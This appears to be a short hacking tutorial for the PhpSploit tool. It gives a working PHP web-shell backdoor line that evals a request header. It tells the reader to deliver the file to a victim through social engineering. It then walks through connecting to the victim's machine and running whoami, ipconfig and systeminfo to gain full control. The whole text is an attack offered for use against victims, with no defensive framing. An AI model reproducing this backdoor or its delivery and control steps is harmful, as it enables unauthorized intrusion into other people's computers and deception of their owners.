Open your kali Linux terminal and type the following command

It’ll create the backdoor with the message Current backdoor is: <?php @eval($_SERVER[ ‘HTTP_PHPSPLOIT’]); ?>
See the example below:

Now open leafpad/notepad and paste the above code and save it in .php extension

Now send this backdoor file to the victim using any social engineering technique. In my case I’m using Xampp and paste it in htdocs folder and wait for the victim to click on the .php file.

Now you can view the backdoor image

Now type set target http://192.168.1.3/script/script.php (location of file in victim’s PC)
Now you can connect with the target PC.
Now type whoami command, it will show you the user details and type pwd command to check the location of your backdoor file in target PC.

Now type run ipconfig command to check IP configuration of victim’s PC.

Now type run systeminfo command to check system information of victim’s PC.
(Now you get complete access of victim’s PC and can run any command)
